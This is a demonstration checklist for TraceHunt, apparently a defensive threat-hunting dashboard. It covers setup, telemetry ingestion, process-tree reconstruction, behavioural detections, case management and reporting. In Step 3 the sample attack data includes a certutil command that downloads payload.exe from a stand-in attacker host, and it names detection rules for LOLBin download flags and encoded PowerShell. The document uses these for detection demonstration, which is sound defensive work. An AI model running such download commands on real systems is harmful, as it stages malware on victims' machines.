# TraceHunt — Final Demonstration Checklist (5–10 Minute Walkthrough)

This checklist provides a streamlined, rapid operational walkthrough designed to demonstrate the full end-to-end capabilities of **TraceHunt** to an audience or evaluator in under 10 minutes.

---

## 1. Prerequisites & Environment Check

Before beginning, ensure your environment meets these basic requirements:

- **Python Runtime:** Python 3.11+ (Validated on Python 3.14.3)
- **Terminal Shell:** Bash / Zsh (macOS / Linux) or PowerShell (Windows)
- **Browser:** Any modern desktop browser (Chrome, Safari, Firefox, Edge)
- **Local Ports:** Port `8000` (FastAPI) and Port `8501` (Streamlit) must be free.

### Setup & Installation (One-Time)
From the repository root (`/Users/sanyakumari/Desktop/Project`):

**macOS / Linux:**
```bash
# 1. Create and activate a virtual environment
python3 -m venv .venv
source .venv/bin/activate

# 2. Install pinned dependencies
pip install -r requirements.txt

# 3. Initialize database schema and detection rules
python3 -c "from tracehunt.database import init_db; init_db(seed_rules=True)"
```

**Windows PowerShell:**
```powershell
# 1. Create and activate a virtual environment
python -m venv .venv
.\.venv\Scripts\Activate.ps1

# 2. Install pinned dependencies
pip install -r requirements.txt

# 3. Initialize database schema and detection rules
python -c "from tracehunt.database import init_db; init_db(seed_rules=True)"
```

---

## 2. Launching the Services

TraceHunt requires two services running in separate terminal windows:

### Terminal 1: FastAPI REST API
```bash
python3 -m uvicorn tracehunt.api.app:app --host 127.0.0.1 --port 8000
```
- **Service URL:** `http://127.0.0.1:8000`
- **Swagger Documentation:** [http://127.0.0.1:8000/docs](http://127.0.0.1:8000/docs)
- **Expected Console Output:** `Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)`

### Terminal 2: Streamlit SOC Dashboard
```bash
python3 -m streamlit run tracehunt/dashboard/app.py --server.port 8501
```
- **Dashboard URL:** [http://localhost:8501](http://localhost:8501)
- **Expected Console Output:** `You can now view your Streamlit app in your browser at http://localhost:8501`

---

## 3. Step-by-Step 5–10 Minute Demonstration Workflow

### Step 1: Open the SOC Overview (30 Seconds)
1. Open [http://localhost:8501](http://localhost:8501) in your browser.
2. Select **"SOC Overview"** from the left navigation sidebar.
3. **What to Observe:**
   - Real-time aggregate metric cards dynamically computed from SQLite:
     - Total Ingested Events
     - Monitored Hosts
     - Unresolved Parents
     - Active Behavioral Findings
     - Open Hunt Cases
   - Findings Severity Breakdown chart (High, Medium, Low).
   - Recent Detection Alerts table with timestamp, host, and rule ID.

---

### Step 2: Ingest Raw Threat Telemetry (1 Minute)
1. In the sidebar, click **"Telemetry Ingestion"**.
2. Click **"Browse files"** and select:
   `fixtures/suspicious/attack_tree.json`
3. Click the blue **"Process Telemetry Ingestion"** button.
4. **What to Observe:**
   - Ingestion summary banner: `5 records processed successfully in 0.01s`.
   - Metrics card breakdown:
     - `Records Read: 5`
     - `Events Normalized: 5`
     - `Duplicates Skipped: 0`
     - `Errors Recorded: 0`
   - *Test Idempotency:* Click **"Process Telemetry Ingestion"** a second time immediately.
   - Observe that `Duplicates Skipped: 5` and `Events Normalized: 0`. The database was not polluted with duplicate records due to SHA-256 fingerprint deduplication!

---

### Step 3: Explore Reconstructed Process Tree DAG (2 Minutes)
1. In the sidebar, click **"Host & Process Explorer"**.
2. In the Host selector dropdown, choose **`VICTIM-HOST`** (or `THREAT-HOST`).
3. Click the **"🌳 Process Execution Tree"** tab.
4. **What to Observe:**
   - A complete parent-child process execution hierarchy reconstructed via NetworkX:
     ```
     [PID 1000] C:\Windows\explorer.exe (User: CORP\victim)
       └── [PID 2000] C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
             └── [PID 3000] C:\Windows\System32\cmd.exe
                   └── [PID 4000] C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                         └── [PID 5000] C:\Windows\System32\certutil.exe
     ```
   - Click to expand **PID 5000 (`certutil.exe`)** to inspect its command line:
     `certutil.exe -urlcache -split -f http://evil.attacker.com/payload.exe C:\Users\victim\payload.exe`
   - Highlight: The platform identified `WINWORD.EXE` spawning `cmd.exe`, disambiguating PID reuse temporally (`parent.event_time <= child.event_time`).

---

### Step 4: Evaluate Behavioral Detections & Explainability (1.5 Minutes)
1. In the sidebar, click **"Findings & Detections"**.
2. Click the green **"Evaluate Telemetry"** button to execute the 5 behavioral rules against all events.
3. Review the generated alerts on `VICTIM-HOST`:
   - **Finding 1 — `RULE-002-PROC-SPAWN` (HIGH):**
     *Rationale:* Office application `winword.exe` spawned command shell `cmd.exe`.
   - **Finding 2 — `RULE-001-LOLBIN` (HIGH):**
     *Rationale:* `powershell.exe` invoked with suspicious base64 flag (`-enc`).
   - **Finding 3 — `RULE-001-LOLBIN` (HIGH):**
     *Rationale:* `certutil.exe` executed with download flags (`-urlcache -split -f`).
4. **Highlight to Evaluators:** Every single finding links directly to `endpoint_event_id`, displaying the exact matched fields, rule version, and known operational caveats.

---

### Step 5: Chronological Forensic Host Timeline (1 Minute)
1. In the sidebar, click **"Host Timeline"**.
2. Select host **`VICTIM-HOST`**.
3. **What to Observe:**
   - Unified chronological event log interleaving process creation, termination, and authentication events with deterministic microsecond tie-breaking.
   - Colored visual alert tags on suspicious events.
   - Filter by keyword: Type `certutil` into the Search filter box to isolate the download event instantly.

---

### Step 6: Case Management, Evidence Attachment & Audit Trail (2 Minutes)
1. In the sidebar, click **"Investigation Cases"**.
2. In the **"Create New Case"** form, fill in:
   - **Case Title:** `Suspicious Macro Execution on VICTIM-HOST`
   - **Host:** `VICTIM-HOST`
   - **Lead Reviewer:** `lead_analyst`
   - **Summary:** `Weaponized Word document spawned command shell and staged remote executable.`
3. Click **"Create Investigation"**.
4. Inside the active case card:
   - **Transition Status:** Select `INVESTIGATING` from the status dropdown and click **"Update Status"**.
   - **Attach Evidence:** Under "Attach Evidence", select Finding #3 (`certutil.exe` LOLBIN) and enter note: `Adversary staging URL confirmed`. Click **"Attach Finding as Evidence"**.
   - **View Audit Trail:** Expand the **"Analyst Audit History"** section.
   - Observe the immutable audit log:
     - `[CASE_CREATED]` by `lead_analyst`
     - `[STATUS_CHANGED]` by `lead_analyst` (OPEN $\rightarrow$ INVESTIGATING)
     - `[EVIDENCE_ATTACHED]` by `lead_analyst`

---

### Step 7: Export Executive Investigation Report (1 Minute)
1. In the sidebar, click **"Report Generator"**.
2. Under "Target Case", choose your active case: `INV-... (VICTIM-HOST)`.
3. Under "Export Formats", check both **JSON** and **HTML**.
4. Click **"Generate Investigation Report"**.
5. **What to Observe:**
   - Success notification displaying generated report IDs.
   - Download buttons:
     - **"Download JSON Report"** (`reports/RPT-*.json`) — structured format for SIEM/SOAR ingestion.
     - **"Download HTML Report"** (`reports/RPT-*.html`) — executive HTML briefing.
   - The executive HTML briefing preview renders inline, showing executive summary cards, severity pie-distribution, case disposition, evidence registry, and forensic timeline with XSS autoescaping applied.

---

## 4. Stopping the Application Safely

When finished with the demonstration:

1. **Terminal 1 (FastAPI):** Press `CTRL + C` to gracefully stop Uvicorn.
2. **Terminal 2 (Streamlit):** Press `CTRL + C` to stop Streamlit.
3. If running in background daemon mode:
   ```bash
   pkill -f "uvicorn tracehunt.api.app:app"
   pkill -f "streamlit run tracehunt/dashboard/app.py"
   ```

---

## 5. Demonstration Data Cleanup (Optional)

To return the environment to a fresh baseline:
```bash
# Delete local SQLite database and write-ahead logs
rm -f data/tracehunt.db data/tracehunt.db-shm data/tracehunt.db-wal

# Delete generated reports
rm -f reports/*.json reports/*.html

# Re-initialize clean schema and seed detection rules
python3 -c "from tracehunt.database import init_db; init_db(seed_rules=True)"
```

---

## 6. Common Errors & Quick Fixes

| Issue / Error Symptom | Root Cause | Solution |
| :--- | :--- | :--- |
| `Address already in use: 8000` or `8501` | A previously launched server is still running in background. | Run `lsof -i :8000` (or `:8501`) and terminate with `kill -9 <PID>`, or use `pkill -f uvicorn`. |
| `no such table: endpoint_events` | Database file has not been initialized. | Run `python3 -c "from tracehunt.database import init_db; init_db(seed_rules=True)"`. |
| `400 Bad Request: File extension .evtx not supported` | Attempting to upload a binary `.evtx` file directly. | TraceHunt ingests pre-exported JSON, JSONL, or CSV. Upload `fixtures/suspicious/attack_tree.json` instead. |
| Ingestion reports 0 new events | File was already imported in the current session. | The SHA-256 idempotency engine skipped duplicate payloads. Use clean DB or check the `Duplicates Skipped` counter. |
| Streamlit page is blank or loading indefinitely | WebSocket disconnect or server restart. | Refresh browser page (`Cmd + R` or `F5`). |
